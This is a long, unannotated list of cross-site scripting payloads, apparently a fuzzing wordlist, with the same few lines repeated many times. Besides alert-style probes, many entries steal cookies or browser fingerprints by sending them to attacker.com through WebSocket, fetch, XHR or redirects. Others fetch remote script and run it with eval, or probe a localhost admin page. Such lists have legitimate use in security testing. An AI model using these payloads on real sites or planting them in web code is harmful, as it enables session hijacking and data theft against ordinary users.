<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
